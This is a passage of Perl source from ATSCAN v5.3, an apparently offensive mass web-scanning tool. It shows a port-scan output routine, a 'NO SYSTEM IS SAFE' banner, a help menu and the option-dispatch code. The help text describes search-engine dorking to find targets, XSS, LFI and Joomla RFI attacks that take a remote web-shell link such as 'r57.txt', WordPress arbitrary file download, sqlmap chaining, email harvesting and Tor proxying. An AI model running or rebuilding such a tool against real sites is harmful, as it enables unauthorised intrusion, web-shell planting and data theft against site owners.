      if ($closed7==0){
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$mstart  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$mstart  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed!\n";
        print color RESET;
	  }
      if ($closed8==0){
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed!\n";
        print color RESET;
	  }
    }
    $closed7=0;
    $closed8=0;
    $mstart++;
    print "[ ]............................................................................ \n";
  }
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}

############################################################################################################################################################################################
############################################################################################################################################################################################
sub mabout {
  print color 'bold';
  print "[ ]............................................................................ \n";
  print color 'bold cyan';
  print "
     [+]================================================================[+]
     [+]--------------              ATSCAN V 5.3          --------------[+]
     [+]================================================================[+]
     [+]--------------           AlisamTechnology         --------------[+]
     [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
     [+]------        https://www.youtube.com/user/aliartes       ------[+]
     [+]================================================================[+]
     [+]======================    DISCLAIMER !!!  ======================[+]
     [+]  We will not be responsible or liable, directly or indirectly  [+]
     [+]  in any way for any loss or damage of any kind incurred as     [+]
     [+]                  a result of use of our material !!            [+]
     [+]================================================================[+]
     [+]                      NO SYSTEM IS SAFE !!!                     [+]
     [+]       If you like my tool you must know that i never           [+]
     [+]                      studied scripting!                        [+]
     [+]                NO Monopoly for the Knowledge!                  [+]
     [+]================================================================[+]
    \n";
  print color 'magenta', RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub help {
  print color 'bold';
  print "[ ]............................................................................ \n\n";
  print color 'bold yellow';
  print "[..] HELP:: \n";
  print color RESET;
  print "   --proxy       | Set tor proxy [EX: socks://localhost:9050]\n";
  print "   -dork         | Dork to search [Ex: house,cars,hotel] \n";
  print "   --level       | Scan level (+- Number of page results to scan) \n";
  print "   -t            | Target \n";
  print "   --sqlmap      | Sqlmaping xss results \n";
  print "   --xss         | Xss scan \n";
  print "   --lfi         | Local file inclusion \n";
  print "   --joomrfi     | Scan for joomla local file inclusion\n";
  print "   --shell       | Shell link [Ex: http://www.site.com/shell.txt] \n";
  print "   --wpadf       | Scan wordpress sites for arbitery file download\n";
  print "   --admin       | Get site admin page \n";
  print "   --shost       | Get site subdomains \n";
  print "   --ports       | Scan server ports \n";
  print "   --start       | Start scan port \n";
  print "   --end         | End scan port \n";
  print "   --all         | Complete mode \n";
  print "   --basic       | Basic mode \n";
  print "   --select      | Select mode you can set rang of ports \n";
  print "   --sites       | Sites in the server \n";
  print "   --wp          | Wordpress sites in the server\n";
  print "   --joom        | Joomla sites in the server\n";
  print "   --upload      | Get sites with upload files in the server  \n";
  print "   --zip         | Get sites with zip files in the server \n";
  print "   --md5         | Convert to md5 \n";
  print "   --encode64    | Encode base64 string \n";
  print "   --decode64    | decode base64 string \n";
  print "   --TARGET      | Domain name [Ex: site.com] \n";
  print "   --FULL_TARGET | Full url [Ex: site.com/index.php?id=5] \n";
  print "   --valid       | Text for validate results \n";
  print "   --exp         | Exploit\n";
  print "   --command     | Extern Command to execute\n";
  print "   --isup        | Check http status 200. \n";
  print "   --replace     | String to replace \n";
  print "   --with        | String to replace with \n";
  print "   --email       | Get emails \n";
  print "   --save        | File Prefix to save scan [by defaut the tool create one if not set!]\n";
  print "   --rang        | Set ip range [Ex: --rang 124.12.10.144-22.36.14.152]\n";
  print "   --nobanner    | Hide tool banner\n";
  print "   --update      | Check and update tool\n\n";

  print color 'bold yellow';
  print "[..] EXAMPLES: \n\n";
  print color RESET;
  print color 'bold';
  print "  Tor: ";
  print color RESET;
  print "--proxy <proxy>\n\n";
  print color 'bold';
  print "  Search engine: \n";
  print color RESET;
  print "    Search: --dork <dork> --level <level> \n";
  print "    Search + get ip: --dork <dork> --level <level> --ip\n";
  print "    Search + get ip + server: --dork <dork> --level <level> --ip --server\n";
  print "    Search with many dorks: --dork <dork1,dork2,dork3> --level <level> \n";
  print "    Search + get emails: --dork <dorks.txt> --level <level> --email \n";
  print "    Search + get site emails: --dork <site:site.com> --level <level> --email \n";
  print "    Search + get ip+server: --dork <dorks.txt> --level <level> \n";
  print "    Search + set save file: --dork <dorks.txt> --level <level> --save myfile.txt\n";
  print "    Search + Replace + Exploit: --dork <dorks.txt> --level <level> --replace <string> --with <string> --valid <string>\n\n";
  
  print color 'bold';
  print "  Subscan from Serach Engine: \n";
  print color RESET;
  print "    Search + Exploitation: --dork <dork> --level <10> --xss/--lfi/--wp ... \n";
  print "    Search + Server Exploitation: -t <ip> --level <10> --xss/--lfi/--wp ... \n";
  print "    Search + Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> --xss/--lfi/--wp ... \n\n";
  
  print color 'bold';
  print "  Validation: \n";
  print color RESET;
  print "    Search + Exploit + Validation: --dork <dork> --level <10> --exp --isup/--valid <string>\n";
  print "    Search + Server Exploit + Validation: -t <ip> --level <10> --exp --isup/--valid <string>\n";
  print "    Search + Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> --isup/--valid <string>\n\n";
  print color 'bold';
  print "  Use List / Target: \n";
  print color RESET;
  print "    -t <target/targets.txt> --exp --isup/--valid <string>\n";
  print "    -t <target/targets.txt> --xss/--lfi .. \n\n";
  print color 'bold';
  print "  Server: \n";
  print color RESET;
  print "    Get Server sites: -t <ip> --level <value> --sites\n";
  print "    Get Server wordpress sites: -t <ip> --level <value> --wp \n";
  print "    Get Server joomla sites: -t <ip> --level <value> --joom \n";
  print "    Get Server upload sites: -t <ip> --level <value> --upload \n";
  print "    Get Server zip sites files: -t <ip> --level <value> --zip \n";
  print "    WP Arbitry File Download: -t <ip> --level <value> --wpadf \n";
  print "    Joomla RFI: -t <ip> --level <1> --joomfri --shell <shell link>\n";
  print "    Scan basic tcp (quick): -t <ip> --ports --basic tcp\n";
  print "    Scan basic udp basic (quick): -t <ip> --ports --basic udp\n";
  print "    Scan basic udp+tcp: -t <ip> --ports --basic udp+tcp\n";
  print "    Scan complete tcp: -t <ip> --ports --all tcp\n";
  print "    Scan complete udp: -t <ip> --ports --all udp\n";
  print "    Scan complete udp+tcp: -t <ip> --ports --all udp+tcp\n";
  print "    Scan range tcp: -t <ip> --ports --select  tcp --start <value> --end <value>\n";
  print "    Scan range udp: -t <ip> --ports --select  udp--start <value> --end <value>\n";
  print "    Scan range udp + tcp: -t <ip> --ports --select  udp+tcp --start <value> --end <value>\n\n";
  print color 'bold';
  print "  Encode / Decode: \n";
  print color RESET;
  print "    Generate MD5: --md5 <string> \n";
  print "    Encode base64: --encode64 <string>  \n";
  print "    Decode base64: --decode64 <string> \n\n";
  
  print color 'bold';
  print "  External Command: \n";
  print color RESET;
  print "   --dork <dork/dorks.txt> --level <level> --command \"curl -v --TARGET\" \n";
  print "   --dork <dork/dorks.txt> --level <level> --command \"curl -v --FULL_TARGET\" \n";
  print "   -t <target/targets.txt> --level <level> --command \"curl -v --TARGET\" \n";
  print "   -t <target/targets.txt> --command \"curl -v --FULL_TARGET\" \n";
  
  print color 'bold';
  print "  Multiple Scan: \n";
  print color RESET;
  print "    --dork <dork> --level <10> --xss/--lfi/--wp ... \n";
  print "    --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> --xss --lfi --wp ...\n";
  print "    -t <ip> --level <10> --xss --lfi --wp ... \n";
  print "    -t <targets> --xss --lfi --wp ... \n";
  
  print color 'bold';
  print "  Check and update: \n";
  print color RESET;
  print "    --update\n\n";

  
  
  
}
############################################################################################################################################################################################
############################################################################################################################################################################################
if ((defined $Target) || (defined $rangip)) {
  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails)) {
  advise();
  }
} 
############################################################################################################################################################################################
############################################################################################################################################################################################
if ((defined $replace) && (defined $with)) {
  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails)) {
  advise();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
if (defined $msites){
  if (!defined $mlevel) {
    print color 'bold';
    print "[ ] ----------------------------------------------------------------------- [ ]\n";
    print color 'RESET';
    print color 'yellow';
    print "[!] To scan server sites You have to set level [Ex: --level 10]!\n";
    print color 'RESET';
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
if ((defined $sqlmap) && (!defined $mxss)) {
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color 'RESET';
  print color 'yellow';
  print "[!] You have to make a xss scan first! [Ex: --xss --sqlmap] OR use Command!\n";
  print color 'RESET';
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
if ((defined $dork) && (!defined $mlevel)) {
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color 'RESET';
  print color 'yellow';
  print "[!] You have to set scan level [Ex: --level 10]\n";
  print color 'RESET';
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
if ((defined $dork) || (defined $Target) || (defined $rangip)) {
  if (defined $mjoomrfi) {
	if (!defined $shell) {
      print color 'bold';
      print "[ ] ----------------------------------------------------------------------- [ ]\n";
      print color 'RESET';
      print color 'yellow';
      print "[!] You have to set shell link! [Ex: http://www.site.co.uk/r57.txt]\n";
      print color 'RESET';
	  exit();
    }
  }
  if (((defined $replace) && (!defined $with)) || ((!defined $replace) && (defined $with))){
    print color 'bold';
    print "[ ] ----------------------------------------------------------------------- [ ]\n";
    print color 'RESET';
    print color 'yellow';
    print "[!] Invalid option! [Ex: --replace <value> --with <value>]\n";
    print color 'RESET';
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
if (defined $mlevel) {
  if ($mlevel < 10) {
    print color 'bold';
    print "[ ] ----------------------------------------------------------------------- [ ]\n";
    print color 'RESET';
    print color 'yellow';
    print "[!] Min level is 10 [--level >=10]\n";
    print color 'RESET';
	exit();
  }

  if ((defined $dork) || (defined $Target) || (defined $rangip)){
    if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails)) {
      submsearch();
      exit();
    }else{
      submsearch();
	  if (defined $dork) {
	    if (defined $misup) { misup();}
	    if (defined $validation_text) {mvalidation();}
        if (defined $command) {mcommand();}
        if (defined $mxss) {
          if (defined $sqlmap) {
	        mxss(); sqlmap();
          }else{
            mxss();
	      }
        }
		if (defined $mlfi) { mlfi();}
		if (defined $mjoomrfi) { mjoomrfi();}
		if (defined $mwpadf) { mwpadf();}
		if (defined $madmin) { madmin();}
		if (defined $msubdomain) { msubdomain();}
		if (defined $mwpsites) { mwpsites();}
		if (defined $mjoomsites) { mjoomsites();}
		if (defined $mupload) { muploadsites();}
		if (defined $mzip) { mzipsites();}
	    if (defined $mmails) { mmails();}
	  }elsif (defined $Target) {
	    if (defined $misup) { misup();}
	    if (defined $validation_text) {mvalidation();}
        if (defined $command) {mcommand();}
        if (defined $mxss) {
          if (defined $sqlmap) {
	        mxss(); sqlmap();
          }else{
            mxss();
	      }
        }
		if (defined $mlfi) { mlfi();}
		if (defined $mjoomrfi) { mjoomrfi();}
		if (defined $mwpadf) { mwpadf();}
		if (defined $madmin) { madmin();}
		if (defined $msubdomain) { msubdomain();}
		if (defined $mwpsites) { mwpsites();}
		if (defined $mjoomsites) { mjoomsites();}
		if (defined $mupload) { muploadsites();}
		if (defined $mzip) { mzipsites();}
	    if (defined $mmails) { mmails();}
	  }
    }
   exit();
  }
}else{
  if ((defined $Target)  || (defined $rangip)){
    scandetail();
	forwait();
    if (defined $misup) {misup();}
    if (defined $validation_text) { mvalidation();}
    if (defined $command) {mcommand();}
    if (defined $mxss) {
      if (defined $sqlmap) {
	    mxss(); sqlmap();
      }else{
        mxss();
	  }
    }
	if (defined $mlfi) { mlfi();}
	if (defined $mjoomrfi) { mjoomrfi();}
	if (defined $mwpadf) { mwpadf();}
	if (defined $madmin) { madmin();}
	if (defined $msubdomain) { msubdomain();}
	if (defined $mwpsites) { mwpsites();}
	if (defined $mjoomsites) { mjoomsites();}
	if (defined $mupload) { muploadsites();}
	if (defined $mzip) { mzipsites();}
	if (defined $mmails) { mmails();}
	if (defined $mports) { 
      if (defined $mbasic) {
        if ($mbasic eq "tcp") { basic('tcp'); }
        if ($mbasic eq "udp") { basic('udp'); }
        if (($mbasic eq "udp+tcp") || ($mbasic eq "tcp+udp")) { basic2();}
	  }
      if (defined $mall) {
        if ($mall eq "tcp") { complete('tcp');}
        if ($mall eq "udp") { complete('udp');}
        if (($mall eq "udp+tcp") || ($mall eq "tcp+udp")) { complete2(); }
	  }
      if (defined $muser) {
	    if ((!defined $mstart) && (!defined $mend)) {
          print color 'yellow';
          print "[!] Set a port range! [Ex: --start 21 --end 81]\n";
          print color 'RESET';
	      exit();
	    }else{
          if ($muser eq "tcp") { user('tcp');}
          if ($muser eq "udp") { user('udp');}
          if (($muser eq "udp+tcp") || ($muser eq "tcp+udp")) { user2(); }
		}
	  }
	}
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64)) {
  use Digest::MD5;
  use MIME::Base64;
  if (defined $mmd5) { mmd5();exit();
  }elsif (defined $mencode64) { mencode64();exit();
  }elsif (defined $mdecode64) { mdecode64();exit();}
}
############################################################################################################################################################################################
############################################################################################################################################################################################
if (defined $mabout) { mabout(); exit();}
if (defined $checkversion) { checkversion(); exit();}
if (defined $help) { help(); exit();}
############################################################################################################################################################################################
############################################################################################################################################################################################
